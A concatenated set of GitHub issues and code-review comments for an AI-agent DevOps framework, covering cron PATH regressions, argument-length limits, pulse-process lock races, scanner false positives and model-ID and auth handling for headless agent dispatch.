- supervisor process prompt text is still excluded
- backfill decisions reflect true worker occupancy in PR-heavy cycles

title: fix: regression — inline PATH in cron entries overrides global PATH (reverts #4099)
body:
## Summary

Commit `3987b05e` (t1433: add provider-aware headless runtime, #4116) re-introduced inline `PATH="/usr/local/bin:/usr/bin:/bin"` into the supervisor-pulse cron entry. This was explicitly removed in `efba9c0d` (#4099) because inline PATH overrides the global PATH at the top of crontab, breaking nvm-installed `node`, `bun`, `cargo`, and other tools not in `/usr/local/bin:/usr/bin:/bin`.

## Impact

- `opencode` (Node.js app) fails with `/usr/bin/env: 'node': No such file or directory` because nvm path is stripped
- Pulse runs 1634+ times doing nothing — starts, opencode crashes immediately, exits
- Both providers (anthropic + openai) enter backoff state from repeated failures
- Runners completely non-functional on any system using nvm/fnm/volta for Node.js

## Root cause

#4116 rewrote the cron entry template from scratch (adding `OPENCODE_BIN=`, `AIDEVOPS_HEADLESS_MODELS=`, etc.) and re-added inline `PATH=` that #4099 had removed. The regression was not intentional — the commit message doesn't mention PATH changes.

## Fix

Remove inline `PATH=` and `OPENCODE_BIN=` from the pulse cron entry in setup.sh. `_ensure_cron_path()` already manages a global PATH line at the top of crontab. `opencode` resolves from PATH at runtime via `command -v`.

Reverts the PATH portion of 3987b05e, preserving all headless runtime functionality.

Closes #4099 regression.

title: pulse-wrapper: Argument list too long on Linux — prompt exceeds MAX_ARG_STRLEN (128KB)
body:
## Bug

`pulse-wrapper.sh` passes the pre-fetched state as a `--prompt` command-line argument to `headless-runtime-helper.sh`. On Linux, the kernel enforces a **per-argument limit** of 128KB (`MAX_ARG_STRLEN = PAGE_SIZE * 32 = 131,072 bytes`). When the pre-fetched state exceeds this, `exec()` fails with `E2BIG`:

```
pulse-wrapper.sh: line 1313: headless-runtime-helper.sh: Argument list too long
```

This is Linux-specific — macOS has no per-argument limit (only total `ARG_MAX`), which is why it was never hit during development.

## Impact

- **Every pulse invocation fails instantly** (ran 0s), producing only "Starting pulse" log entries
- Backfill logic (3 attempts per pulse) amplifies failures to ~4 per cron cycle
- With `*/2` cron, this produces ~120 failed starts per hour
- No actual supervisor work gets done

## Root Cause

```bash
# pulse-wrapper.sh line 1309
local -a pulse_cmd=("$HEADLESS_RUNTIME_HELPER" run --role pulse --session-key supervisor-pulse --dir "$PULSE_DIR" --title "Supervisor Pulse" --prompt "$prompt")
```

`$prompt` includes `/pulse` + pre-fetched state from `$STATE_FILE` (currently 135,606 bytes > 131,072 byte limit).

## Fix

`headless-runtime-helper.sh` already supports `--prompt-file FILE`. Change `run_pulse()` to write the prompt to a temp file and use `--prompt-file` instead of `--prompt`:

```bash
local prompt_file
prompt_file=$(mktemp "${HOME}/.aidevops/logs/pulse-prompt.XXXXXX")
printf '%s' "$prompt" > "$prompt_file"
local -a pulse_cmd=("$HEADLESS_RUNTIME_HELPER" run --role pulse --session-key supervisor-pulse --dir "$PULSE_DIR" --title "Supervisor Pulse" --prompt-file "$prompt_file")
```

Cleanup the temp file after `run_pulse()` completes (in the existing cleanup path).

## Environment

- OS: Linux (Ubuntu)
- Kernel ARG_MAX: 2,097,152 bytes (total)
- Kernel MAX_ARG_STRLEN: 131,072 bytes (per argument)
- State file size: 135,606 bytes
- aidevops version: 2.172.0

The current method of detecting a date parsing failure by checking if `expiry_epoch` is `"0"` is not fully robust. While it handles the case where `date` commands fail, it introduces a bug for the edge case where a certificate's expiry is exactly at epoch 0 (1970-01-01 00:00:00 UTC). In that scenario, `date` would correctly return `"0"`, but your script would incorrectly report a parsing failure.

A more reliable way to detect failure is to check if the `date` command pipeline produced any output, as it will produce no output on failure. This correctly distinguishes between a parsing failure and a valid epoch time of 0.

```suggestion
		expiry_epoch=$(date -j -f "%b %d %H:%M:%S %Y %Z" "$not_after" "+%s" 2>/dev/null || date -d "$not_after" "+%s" 2>/dev/null)
		if [[ -z "$expiry_epoch" ]]; then
			print_warning "Unable to parse certificate expiry date: $not_after"
		else
			local now_epoch
			now_epoch=$(date "+%s")
			local days_left=$(((expiry_epoch - now_epoch) / 86400))

			if [[ "$days_left" -lt 0 ]]; then
				print_error "Certificate EXPIRED ($days_left days ago)"
			elif [[ "$days_left" -lt 30 ]]; then
				print_warning "Certificate expires in $days_left days"
			else
				print_success "Certificate valid for $days_left days"
			fi
		fi
```

If the LLM returns a `details` string containing a code snippet or other structured text with these characters, the extraction will fail, and the valid response will be discarded.

For example, this valid response would fail to parse:


This brittleness could lead to the script failing on valid LLM outputs. A fully robust solution in pure shell is difficult, but this limitation should be acknowledged. Consider either further constraining the LLM prompt to not use `{` or `}` in the `details` field, or using a tool with more advanced regex capabilities if portability allows. For robust JSON parsing, especially when content might contain special characters, `jq` is generally preferred over fragile `grep` regexes.

title: bug: setup.sh deploys main checkout even when run from a worktree
body:
**Describe the bug**
Running `./setup.sh --non-interactive` from a feature worktree appears to deploy agents from the canonical main checkout instead of the current worktree. This prevents live validation of branch changes and can silently deploy stale scripts.

**To reproduce**
1. Create a worktree and modify a deployed script (example used in this session: `.agents/scripts/pulse-wrapper.sh`).
2. Run `./setup.sh --non-interactive` from the worktree path.
3. Read the deployed file at `~/.aidevops/agents/scripts/pulse-wrapper.sh`.
4. Observe the deployed file does not contain the worktree-only edits.

**Expected behavior**
`setup.sh` should deploy from the current checkout/worktree where it is executed, or explicitly fail with a clear error if running from an unsupported path.

**Environment**
- OS: macOS (darwin)
- aidevops version: 2.172.3
- Shell: zsh/bash

**Does this involve a third-party tool?**
No.

**Additional context**
The script warns about non-recommended location but still reports successful deployment. For reliability work, this creates a false-positive deploy signal.

title: bug: pulse-wrapper PID file deleted at run end creates dedup race window
body:
## Problem

The pulse-wrapper dedup mechanism uses a PID file (`~/.aidevops/logs/pulse.pid`) to prevent concurrent pulse instances. However, the PID file is deleted at the end of each run (lines 1533, 2212 in pulse-wrapper.sh). This creates a race window:

1. Pulse A completes → deletes PID file
2. launchd fires (every 120s) → sees no PID file → starts Pulse B
3. Before Pulse B writes its PID, launchd fires again → sees no PID file → starts Pulse C
4. Both B and C run concurrently

**Observed impact:** 82 concurrent pulse-wrapper processes, 16+ workers over max-8 capacity, circuit breaker tripped (2026-03-13T02:06:01Z). See issue #4318.

**Immediate mitigation applied:** Manually wrote opencode PID to pulse.pid to stop new wrappers from starting. Killed stale wrapper processes.

## Root Cause

The PID file is deleted at cleanup time (end of run) rather than being left in place until the NEXT run starts. The check_dedup() function only prevents concurrent runs when the PID file exists — but there's a window between deletion and the next write.

## Fix

Option A (preferred): Don't delete the PID file at run end. Instead, write a sentinel value (e.g., `IDLE`) or the timestamp of last completion. check_dedup() should check: if PID file contains a running PID → skip; if PID file contains IDLE/timestamp → proceed (overwrite with new PID).

Option B: Use `flock` on a separate lock file that is never deleted, only locked/unlocked. This is atomic and race-free.

Option C: Write the wrapper's own PID (`3483080`) to the PID file BEFORE the check_dedup() call, not after. The current code writes `3483080` at line 2196 AFTER check_dedup() passes — but check_dedup() itself doesn't write anything, so the window exists between the check and the write.

## Related

- Issue #4318: circuit breaker trip
- Issue #4282: pulse-wrapper quality debt (different issue)
- Issue #4322: tighten pulse cold-start timeout (related mitigation)

title: fix review-bot-gate-helper.sh: use REST API for PR age when GraphQL is rate-limited
body:
## Problem

When the GitHub GraphQL API is rate-limited, `review-bot-gate-helper.sh` falls back to `pr_age=0` (line ~95: empty `created_at` → `echo 0`). This causes the gate to report `WAITING` with the full grace period remaining, even for PRs that are hours old.

**Observed:** PR #4338 was 4h 20m old (past the 4h grace period) but the gate returned `WAITING` with "240min remaining" because GraphQL was rate-limited and `created_at` came back empty.

## Root cause

`get_pr_age_seconds()` uses:
```bash
created_at=$(gh pr view "$pr_number" --repo "$repo" --json createdAt -q '.createdAt' 2>/dev/null || echo "")
```

`gh pr view --json` uses GraphQL. When rate-limited, it returns an error and `created_at` is empty → function returns 0.

## Fix

Fall back to REST API when GraphQL fails:
```bash
created_at=$(gh pr view "$pr_number" --repo "$repo" --json createdAt -q '.createdAt' 2>/dev/null)
if [[ -z "$created_at" ]]; then
  # GraphQL rate-limited — fall back to REST
  created_at=$(gh api "repos/${repo}/pulls/${pr_number}" --jq '.created_at' 2>/dev/null || echo "")
fi
```

REST API (`gh api repos/.../pulls/NNN`) has a separate rate limit from GraphQL and is typically available when GraphQL is exhausted.

## Impact

PRs past the grace period are incorrectly blocked from merging when GraphQL is rate-limited. Requires manual intervention (as happened with PR #4338 on 2026-03-13).

title: fix(pulse): workers thrashing with 5000+ messages and 0 commits — pre-edit guard or worktree conflict
body:
## Observation

In the 2026-03-13 07:46Z pulse, all 26 active workers showed struggle_ratio of 5579–6441 (thousands of messages, 0 commits on most). This is severe thrashing.

## Evidence

- PID 1495242 (6h39m): 5579 messages, 1 commit
- PID 1495927 (6h27m): 5579 messages, 0 commits
- PID 1505328 (6h18m): 5579 messages, 0 commits
- All remaining workers: 6439–6441 messages, 0 commits

## Root cause hypothesis

1. Workers hitting pre-edit-check.sh guard on main without creating worktrees — spinning trying to edit files they can't touch
2. Multiple workers dispatched to same issue (observed: #3502 x2, #3525 x2, #3556 x2) causing worktree name conflicts
3. Workers unable to find the target file (path resolution failure) and looping

## Proposed fix

1. Add deduplication check in pulse dispatch: before dispatching a worker for an issue, check if an active worker is already running for that issue (by scanning running process cmdlines for the issue number)
2. Add a struggle_ratio threshold in pulse: if a worker exceeds 500 messages with 0 commits, kill it and re-dispatch with a more explicit prompt
3. Improve pre-edit-check.sh error messaging so workers understand they need a worktree, not just that they're blocked

title: fix(pulse-wrapper): add lock guard to prevent concurrent pulse instances
body:
## Observation

In the 2026-03-13 ~09:00Z pulse, **14 concurrent pulse instances** were running simultaneously (PIDs from 08:49–08:55Z, all launched within 6 minutes). Each spawned its own worker set before the previous pulse could assess running workers, resulting in 52 active workers against a 24-slot pool.

## Evidence

```
ps aux | grep 'opencode run /pulse' | grep -v grep | wc -l
# Output: 14
```

All 14 instances were launched by `sandbox-exec-helper.sh` wrapping `pulse-wrapper.sh` within a 6-minute window.

## Root cause hypothesis

`pulse-wrapper.sh` does not check for an already-running pulse before launching. If the scheduler fires while a previous pulse is still running (e.g., due to slow state fetch or large worker dispatch), a new pulse starts in parallel.

## Proposed fix

Add a PID-file lock at the start of `pulse-wrapper.sh`:
```bash
LOCK_FILE="${TMPDIR:-/tmp}/pulse-wrapper.lock"
if [[ -f "$LOCK_FILE" ]]; then
  existing_pid=$(cat "$LOCK_FILE")
  if kill -0 "$existing_pid" 2>/dev/null; then
    echo "Pulse already running (PID $existing_pid), exiting" >&2
    exit 0
  fi
fi
echo $$ > "$LOCK_FILE"
trap 'rm -f "$LOCK_FILE"' EXIT
```

## Related

- Issue #4400: worker-level thrashing (pre-edit guard / worktree conflict)
- This issue: supervisor-level thrashing (concurrent pulse instances)

title: fix: pulse sessions overlapping — launchd fires new pulse before prior exits
body:
## Observation

During pulse at 2026-03-14T00:08Z, 6 concurrent pulse sessions were detected running simultaneously (PIDs: 3095551, 3245841, 3373539, 3381328, 3443412, 3507937 + the current session).

## Root Cause Hypothesis

The launchd scheduler fires a new pulse every 2 minutes regardless of whether the prior pulse has exited. When a pulse takes >2 minutes (e.g., due to slow `gh` API calls or worker dispatch), the next pulse starts with a stale pre-fetched state snapshot, potentially seeing dead workers as alive and skipping valid dispatch candidates.

## Impact

1. Stale state: pre-fetched snapshot showed 24 worker PIDs (from a prior cycle) — most were dead by the time this pulse ran
2. Wasted resources: 5+ pulse sessions consuming context/API quota simultaneously
3. Risk of double-dispatch: if circuit breaker misses a race window, two pulses could dispatch the same issue

## Proposed Fix

Add a pulse lock file (`~/.aidevops/logs/pulse.lock`) with PID. On startup, check if the lock PID is still alive — if yes, exit immediately (another pulse is running). Release lock on exit. This is a standard single-instance guard pattern.

Alternatively, use `launchd` `StartInterval` with a longer interval (5 min) and rely on the lock for safety.

## Evidence

```
ps aux | grep 'sandbox-exec-helper.sh run' | grep pulse
# Shows 6 concurrent pulse processes
```

title: fix: quality-feedback-helper.sh should filter Gemini summary-only reviews (no inline comments, state=COMMENTED)
body:
## Problem

`quality-feedback-helper.sh scan-merged` captured a Gemini Code Assist review as a finding (issue #3744) when the review was a **summary comment only** — no inline code comments, review state `COMMENTED` (not `CHANGES_REQUESTED`).

This creates false-positive quality-debt issues that waste triage time.

## Root Cause

The scanner likely captures any review body as a finding without checking:
1. Whether the review state is `CHANGES_REQUESTED` (vs `COMMENTED` or `APPROVED`)
2. Whether there are any inline review comments (`/pulls/{id}/comments` count > 0)
3. Whether the body contains actionable language ("should", "fix", "issue", "bug") vs descriptive language

## Fix

In `quality-feedback-helper.sh`, when scanning merged PR reviews:
- Skip reviews where `state != CHANGES_REQUESTED` AND inline comment count == 0
- OR: apply a simple heuristic — if the review body starts with "This pull request" or "This PR", it's a summary, not a finding
- Log skipped summaries at DEBUG level for traceability

## Evidence

- Issue #3744 (dismissed): Gemini summary review on PR #1121, review ID 3785200986
- Review state: `COMMENTED`, inline comments: 0
- Review body: purely descriptive summary of what the PR does

title: Enforce: every actionable finding from audits/reviews must become a tracked task immediately
body:
## Problem

When an agent produces a multi-finding report (security audit, code review, SEO scan, accessibility check, etc.), it fixes the easy items and creates a PR — but the remaining actionable findings only exist in a comment or report. They are not tracked as TODO entries or GitHub issues, so they silently drop out of the task queue.

**Observed in:** ILDS t068 security audit session. The agent produced a report with 2 high, 5 medium, 5 low findings. It fixed the 2 high + 1 medium in a PR, but did not create follow-up tasks for the remaining 3 actionable medium findings until the user explicitly asked "did you document ALL actionable notes as todos?"

## Root cause

No framework-level rule requires converting audit/review findings into tracked tasks. The agent treats the report itself as the deliverable, rather than treating each actionable finding as a task that needs tracking.

## Proposed fix

Add to `prompts/build.txt` (Completion and quality discipline section) or a new "Report completeness" section:

> **Finding-to-task rule:** When producing any multi-finding report (security audit, code review, SEO scan, accessibility check, performance review, etc.), every finding rated actionable must become a tracked task (TODO.md entry + GitHub issue) before the report is declared complete. Findings fixed in the current PR are tracked by the PR itself. Findings deferred for later must each get their own task ID. A report with untracked actionable findings is incomplete.

This applies to all agent types and all report-producing workflows — not just security audits.

## Scope

Framework-level — applies to every repo managed by aidevops.

title: fix: quality-feedback-helper.sh creates issues for positive/approving reviews
body:
## Problem

`quality-feedback-helper.sh scan-merged` creates quality-debt issues for **any** review comment, including positive/approving reviews with no actionable feedback.

**Example**: Issue #3704 was created from PR #1484's Gemini review which explicitly said:
> "I've reviewed the changes and have no further comments. Good work."

This is a false positive — the scanner treated an approving review as an unactioned finding.

## Root Cause

The scanner does not filter review sentiment before creating issues. It captures all review comments regardless of whether they contain actionable critique or are simply approvals.

## Fix

Before creating a quality-debt issue from a review comment, the scanner should:
1. Check if the review state is `APPROVED` (GitHub review state field)
2. Or perform basic sentiment analysis on the comment body to detect purely positive/approving language ("no further comments", "good work", "LGTM", "looks good", etc.)
3. Skip issue creation for reviews that are clearly approvals with no critique

## Impact

- Creates noise in the issue tracker
- Workers waste time investigating issues that have no actionable content
- Reduces trust in quality-debt issues generally

## Acceptance Criteria

- [ ] `scan-merged` skips reviews with GitHub state `APPROVED` and no inline comments
- [ ] `scan-merged` skips reviews whose body contains only positive/approving language with no actionable items
- [ ] Existing positive-review issues can be bulk-dismissed or identified via a new `--dry-run` flag

title: t1483: Fix model ID handling
body:
**Task ID:** `t1483` | **Status:** open
**Logged:** 2026-03-14
**Tags:** `bugfix` `models` `headless` `orchestration`

## Description

Fix model ID handling — revert Codex removal (PR#4641), add auth-availability pre-check, enforce latest-alias convention — PR#4641 incorrectly removed `openai/gpt-5.3-codex` (available via OpenAI OAuth). Add `provider_auth_available()` to `choose_model()` so providers without auth configured are skipped silently (no failed dispatch, no backoff churn). Works for all users: Codex selected when OpenAI auth present, skipped when not. Also: fix OpenAI auth path (OAuth not just API key), consider OpenCode Zen gateway model IDs, audit for dated snapshot IDs.

## Plan: Purpose

Fix two classes of model ID mismanagement by pulse workers, and make the default model list work for all users regardless of which providers they have configured:
1. **Codex removal (PR#4641):** A worker observed `ProviderModelNotFoundError` for `openai/gpt-5.3-codex` and assumed the model doesn't exist. It does — it's available via OpenAI OAuth subscription. The real issue is auth/provider config (the helper only checks `OPENAI_API_KEY`, not OAuth tokens). The fix replaced Codex with `gpt-4o`, losing coding specialisation and provider diversity.
2. **Haiku snapshot pinning (PR#4647/GH#3337):** A worker tried to pin `claude-haiku-4-5` to `claude-haiku-4-5-20251001` (a dated snapshot from Oct 2025). The codebase convention is to use unversioned latest aliases. PR closed.
3. **Multi-user compatibility:** The default model list must work for users who don't have OpenAI OAuth configured. The current backoff system handles this reactively (fail → backoff → skip on retry), wasting a dispatch attempt. A proactive auth-availability pre-check in `choose_model()` is needed — skip providers with no auth silently, no error, no backoff noise.

<details><summary>Plan: Context & Architecture</summary>


**Phases**

- [ ] **Phase 1 — Revert and add auth pre-check** (~1h): Revert PR#4641's model change in `headless-runtime-helper.sh` (lines 18, 817). Restore `openai/gpt-5.3-codex` in `DEFAULT_HEADLESS_MODELS`. Add `provider_auth_available()` function that checks whether a provider has auth configured (env var, OAuth token, or gateway). Wire it into `choose_model()` loop alongside `provider_backoff_active()` — if no auth, skip silently. Update tests for both auth-present and no-auth scenarios.
- [ ] **Phase 2 — Fix OpenAI auth and provider config** (~45m): Update `compute_auth_signature()` (line 161) to handle OAuth token auth, not just `OPENAI_API_KEY`. Add OpenAI provider entry to `model-routing-table.json`. Evaluate whether `opencode/*` gateway model IDs should be supported as an alternative path for users routing through OpenCode Zen.
- [ ] **Phase 3 — Audit and enforce conventions** (~45m): Scan all model ID references across scripts and configs for dated snapshots. Ensure all active routing uses unversioned latest aliases. Add a note to model-routing.md documenting the convention: latest aliases for routing, dated snapshots only in normalization/parsing paths.

</details>

## Task Brief

# t1483: Fix model ID handling — revert Codex removal and enforce latest-alias convention

## Origin

- **Created:** 2026-03-14
- **Session:** claude-code:interactive
- **Created by:** marcusquinn (human)
- **Conversation context:** User reviewed PR#4641 (which replaced `openai/gpt-5.3-codex` with `openai/gpt-4o` in `DEFAULT_HEADLESS_MODELS`) and flagged that the premise was wrong — Codex *is* available via OpenAI OAuth subscription. The dispatch failure was misdiagnosed as a missing model when the real issue is likely auth/provider config. User also flagged PR#4647 (which pinned `claude-haiku-4-5` to dated snapshot `claude-haiku-4-5-20251001`) as wrong — the convention is to use the latest unversioned alias. PR#4647 closed, GH#3337 closed.

## What

1. Revert the model change from PR#4641 — restore `openai/gpt-5.3-codex` in `DEFAULT_HEADLESS_MODELS` (line 18 and help text line 817).
2. Add auth-availability pre-check to `choose_model()` — before selecting a model, verify the provider has auth configured (not just that it's not backed off). This way Codex stays in the default list but is only selected when OpenAI auth is actually available. Users without OpenAI OAuth simply skip it silently — no failed dispatch, no backoff churn.
3. Investigate and fix the actual root cause of the `ProviderModelNotFoundError` — likely the headless runtime's OpenAI auth path doesn't support OAuth-based access (it only checks `OPENAI_API_KEY` env var at line 161-163). Consider also supporting OpenCode Zen gateway model IDs (e.g., `opencode/gpt-5.3-codex`) as an alternative provider path.
4. Update the provider config in `model-routing-table.json` to include OpenAI as a provider if needed.
5. Update tests in `tests/test-headless-runtime-helper.sh` to match restored model ID and test the auth-availability pre-check (no-auth-configured → skip silently).
6. Audit all model ID references for dated snapshots and enforce the convention: use latest unversioned aliases (e.g., `claude-haiku-4-5` not `claude-haiku-4-5-20251001`). PR#4647/GH#3337 was an example of going the wrong direction.

## Why

PR#4641 was a false fix — it treated a symptom (dispatch failure) by removing a valid model instead of fixing the auth/config issue. Codex is a capable coding model available via OpenAI OAuth subscription, and having it in the headless rotation provides provider diversity (reduces single-provider risk) and access to a strong coding-specific model. Replacing it with `gpt-4o` loses the coding specialisation and doesn't address why the model wasn't reachable.

However, the default model list must work for all users — not just those with OpenAI OAuth configured. The current backoff system handles this reactively (fail → backoff → skip), but this wastes a dispatch attempt and creates noise. The right fix is a proactive auth-availability check: if a provider has no auth configured, skip its models silently during selection. This keeps Codex in the defaults for users who have it, while being invisible to users who don't.

## How (Approach)

1. **Revert the model ID** in `.agents/scripts/headless-runtime-helper.sh`:
   - Line 18: restore `openai/gpt-5.3-codex` in `DEFAULT_HEADLESS_MODELS`
   - Line 817: restore in help text

2. **Add `provider_auth_available()` check** to `choose_model()` (line 510 loop):
   - New function that checks whether a provider has auth configured (env var set, or OAuth token present, or OpenCode Zen gateway available)
   - Called alongside `provider_backoff_active()` in the model selection loop — if no auth, skip silently (no error, no backoff record)
   - Can leverage `model-availability-helper.sh check <provider>` (exit code 3 = API key missing) or do a lightweight inline check
   - For OpenAI: check `OPENAI_API_KEY` env var OR OpenCode OAuth status for OpenAI provider
   - For Anthropic: check `ANTHROPIC_API_KEY` env var OR OpenCode auth status (existing logic)

3. **Fix OpenAI auth signature**: Update `compute_auth_signature()` (line 161) to handle OAuth token auth, not just `OPENAI_API_KEY`.

4. **Consider OpenCode Zen gateway IDs**: For users routing through OpenCode's gateway (e.g., `opencode/gpt-5.3-codex`), the headless runtime currently rejects `opencode/*` models (line 473). Evaluate whether this rejection should be relaxed for non-headless-specific gateway models, or whether the `DEFAULT_HEADLESS_MODELS` should include both direct (`openai/`) and gateway (`opencode/`) variants with the auth check selecting the right one.

5. **Fix provider config**: Add OpenAI provider entry to `model-routing-table.json`.

6. **Update tests**: Restore `openai/gpt-5.3-codex` references and add tests for:
   - No OpenAI auth → Codex skipped silently, Anthropic selected
   - OpenAI auth present → Codex selected on alternate rotation
   - Both providers backed off → returns exit 75

7. **Audit model IDs**: Scan for dated snapshots, enforce latest-alias convention.

Key files:
- `.agents/scripts/headless-runtime-helper.sh:18` — DEFAULT_HEADLESS_MODELS constant
- `.agents/scripts/headless-runtime-helper.sh:113` — auth signature for openai
- `.agents/scripts/headless-runtime-helper.sh:161-163` — OpenAI auth material computation
- `.agents/configs/model-routing-table.json` — provider definitions
- `tests/test-headless-runtime-helper.sh:86-124` — OpenAI rotation tests

## Acceptance Criteria

- [ ] `DEFAULT_HEADLESS_MODELS` contains `openai/gpt-5.3-codex` (not `gpt-4o`)
  ```yaml
  verify:
    method: codebase
    pattern: "openai/gpt-5.3-codex"
    path: ".agents/scripts/headless-runtime-helper.sh"
  ```
- [ ] `gpt-4o` is NOT in `DEFAULT_HEADLESS_MODELS` (it was the wrong replacement)
  ```yaml
  verify:
    method: codebase
    pattern: "DEFAULT_HEADLESS_MODELS.*gpt-4o"
    path: ".agents/scripts/headless-runtime-helper.sh"
    expect: absent
  ```
- [ ] Auth-availability pre-check exists: `choose_model()` skips providers with no auth configured (no error, no backoff — silent skip)
  ```yaml
  verify:
    method: codebase
    pattern: "provider_auth_available"
    path: ".agents/scripts/headless-runtime-helper.sh"
  ```
- [ ] No-auth fallback works: when OpenAI auth is not configured, `select` returns Anthropic model without errors
  ```yaml
  verify:
    method: bash
    run: "unset OPENAI_API_KEY && bash tests/test-headless-runtime-helper.sh"
  ```
- [ ] OpenAI provider auth supports OAuth-based access (not just `OPENAI_API_KEY`)
  ```yaml
  verify:
    method: subagent
    prompt: "Review compute_auth_signature() and provider_auth_available() in headless-runtime-helper.sh and confirm they handle OpenAI OAuth token auth in addition to API key auth"
    files: ".agents/scripts/headless-runtime-helper.sh"
  ```
- [ ] Tests pass: `bash tests/test-headless-runtime-helper.sh`
  ```yaml
  verify:
    method: bash
    run: "bash tests/test-headless-runtime-helper.sh"
  ```
- [ ] Lint clean: `shellcheck .agents/scripts/headless-runtime-helper.sh`
  ```yaml
  verify:
    method: bash
    run: "shellcheck .agents/scripts/headless-runtime-helper.sh"
  ```

## Context & Decisions

- PR#4641 was auto-generated by a pulse worker that observed `ProviderModelNotFoundError` during dispatch and assumed the model ID was invalid.
- The user confirmed Codex is available via OpenAI OAuth subscription — the model exists, the auth path was the problem.
- The `compute_auth_signature()` function (line 161) only checks `OPENAI_API_KEY` env var. If the OpenAI OAuth flow uses a different env var or token mechanism, the helper would see no auth material and the provider would fail.
- `model-routing-table.json` currently has no OpenAI provider entry — only `local` and `anthropic`. This may also contribute to the failure.
- GH#4628 should be reopened or this new issue should reference it as the correct fix.
- PR#4647 tried to pin `claude-haiku-4-5` to `claude-haiku-4-5-20251001` in `model-availability-helper.sh`. This was wrong — the unversioned alias is the convention and is already correct. PR closed, GH#3337 closed.
- Convention: always use latest unversioned model aliases. Dated snapshots are only for normalization/parsing compatibility paths, never for active routing defaults.
- The default model list must work for all users. Not everyone has OpenAI OAuth configured. The existing backoff system handles failures reactively (fail → backoff → skip on retry), but this wastes a dispatch attempt. A proactive `provider_auth_available()` check in `choose_model()` is the right pattern — skip providers with no auth silently, no error, no backoff noise.
- `model-availability-helper.sh` already has provider probing with exit code 3 for missing API keys. The headless runtime could call this or implement a lightweight inline equivalent.
- OpenCode Zen gateway models (`opencode/*`) are currently rejected for headless runs (line 473). This may need revisiting if users route through the gateway for providers they don't have direct API keys for.

## Relevant Files

- `.agents/scripts/headless-runtime-helper.sh:18` — DEFAULT_HEADLESS_MODELS constant to revert
- `.agents/scripts/headless-runtime-helper.sh:113` — auth signature env var mapping
- `.agents/scripts/headless-runtime-helper.sh:161-163` — OpenAI auth material computation
- `.agents/scripts/headless-runtime-helper.sh:817` — help text to revert
- `.agents/configs/model-routing-table.json` — needs OpenAI provider entry
- `tests/test-headless-runtime-helper.sh:86-124` — tests to update
- `.agents/scripts/model-availability-helper.sh:115-131` — model tier definitions (verify no dated snapshots)
- `.agents/scripts/model-availability-helper.sh:1-38` — provider probing with exit code 3 for missing keys (reusable pattern)

## Dependencies

- **Blocked by:** none
- **Blocks:** reliable multi-provider headless dispatch
- **External:** none (the fix must work with OR without OpenAI OAuth configured)

## Estimate Breakdown

|-------|------|-------|

| Implementation | 1.5h | Revert model ID, add auth pre-check, fix auth path, update provider config |

title: quality-feedback-helper.sh: filter purely positive reviews to avoid false-positive quality-debt issues
body:
## Problem

`quality-feedback-helper.sh scan-merged` generates quality-debt issues for Gemini/CodeRabbit reviews that are purely positive confirmations — no inline comments, no actionable suggestions, just a summary saying the changes look good.

**Example**: Issue #3723 (now closed) was auto-generated from PR #1250's Gemini review which stated: *"The changes improve the auditability and reliability of task tracking"* — a positive confirmation with zero inline comments.

This creates noise in the quality-debt backlog and wastes worker cycles triaging non-issues.

## Root Cause

The scanner captures any unresponded review as a finding, regardless of whether the review body contains actionable feedback.

## Proposed Fix

Add a filter in `quality-feedback-helper.sh scan-merged` (or its review-parsing logic) to skip reviews that:
1. Have **zero inline comments** (no `/pulls/{n}/reviews/{id}/comments` entries), AND
2. Review body contains no actionable language (no words like: "should", "consider", "suggest", "recommend", "fix", "change", "update", "missing", "incorrect", "wrong", "issue", "problem", "bug")

A review with no inline comments and only positive/neutral summary language is a confirmation, not a finding.

## Acceptance Criteria

- [ ] `scan-merged` does not generate issues for reviews with 0 inline comments and positive-only body text
- [ ] Existing actionable reviews (with inline comments or negative language) still generate issues
- [ ] Add a `--include-positive` flag to override the filter for debugging

## Evidence

- Issue #3723 (closed as not actionable) — false positive from PR #1250 Gemini review
- @johnwaldo's triage comment on #3723 confirms the pattern

title: fix: quality-feedback-helper.sh should not file issues for positive-only reviews
body:
## Problem

`quality-feedback-helper.sh scan-merged` filed issue #3343 for PR #2166's Gemini review, which was entirely positive (no change requests, no defects). The scanner classified a praise comment as an "unactioned finding".

## Root Cause

The scanner detects any review comment and creates a quality-debt issue without checking whether the review contains actionable feedback. A `COMMENTED` state review with no negative findings should not generate an issue.

## Proposed Fix

Before creating a quality-debt issue from a review, check:
1. Review state is not `APPROVED` (approved reviews are definitionally positive)
2. Review body contains negative signal words (e.g., "should", "must", "consider", "issue", "problem", "bug", "incorrect", "missing") OR explicit change requests
3. If the review is purely positive (only praise, no suggestions), skip issue creation

Alternatively, add a `--min-severity` filter that requires at least one non-positive finding before filing.

## Evidence

- Issue #3343 was filed for a review that said: "The changes are well-implemented and improve the script's robustness and quality." — no action needed.
- Verified: the code in `setup-modules/config.sh:93-99` was already correct per the review.

Closes #3343 (root cause)

title: fix: quality-feedback-helper.sh scan-merged creates false-positive issues when finding already resolved before merge
body:
## Problem

`quality-feedback-helper.sh scan-merged` filed issue #3183 for a finding in `todo/tasks/t1394-brief.md` that was already resolved in the merged code.

**Root cause:** The scanner reads PR review comment bodies (which quote the pre-fix diff hunk) and creates issues without verifying whether the suggested change is already present in the post-merge HEAD.

In PR #2871, Gemini flagged `- **Blocks:** t1393` at line 139. The author corrected it to `- **Enhances:** t1393` before merging. The merge commit `d8d438a5` already contains the fix. But `scan-merged` saw the comment referencing the old text and filed an issue anyway.

## Fix

Before creating a quality-debt issue for a PR review finding, `scan-merged` should:

1. Extract the suggested change from the review comment (the `suggestion` block or the described fix)
2. Check whether the current HEAD of the file already contains the fix
3. Only file an issue if the finding is **not** already resolved in the merged code

For findings without a machine-readable suggestion block, a heuristic check is acceptable: if the comment references a specific string (e.g., `Blocks: t1393`) and that string is absent from the current file, the finding is likely already resolved.

## Impact

False-positive quality-debt issues waste worker time (a full worktree + investigation cycle) and pollute the issue tracker with noise. This was caught quickly, but at scale it degrades trust in the quality-debt pipeline.

## References

- False positive issue: #3183
- Source PR: #2871
- Merge commit: d8d438a5

**File**: `setup-modules/core.sh:429`
_⚠️ Potential issue_ | _🔴 Critical_

**Incorrect package name for `ssh` — will fail installation on most platforms.**

The package name `ssh` doesn't exist on most package managers. The SSH client package names are platform-specific:

| Package Manager | Package Name |
|-----------------|--------------|
| apt (Debian/Ubuntu) | `openssh-client` |
| dnf/yum (Fedora/RHEL) | `openssh-clients` |
| pacman (Arch) | `openssh` |
| apk (Alpine) | `openssh-client` |
| brew (macOS) | `openssh` (but ssh is built-in) |

This requires either a platform-specific lookup or, since ssh is almost universally pre-installed, consider removing it from required deps entirely.

